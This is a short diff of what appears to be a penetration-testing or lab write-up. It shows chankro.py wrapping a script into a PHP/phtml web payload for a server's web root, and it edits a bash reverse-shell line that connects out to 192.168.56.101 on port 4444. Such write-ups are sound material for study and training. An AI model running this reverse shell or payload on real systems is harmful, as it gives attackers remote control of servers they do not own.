@@ -460,9 +460,9 @@ $ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/
 Note: path is the absolute path where our .so will be dropped.
 
 `vim ./reverse_shell.sh`:
-```bash
+```sh
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+bash -i >& /dev/tcp/192.168.56.101/4444 0>&1 2>&1
 ```
 
 `python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html/`:
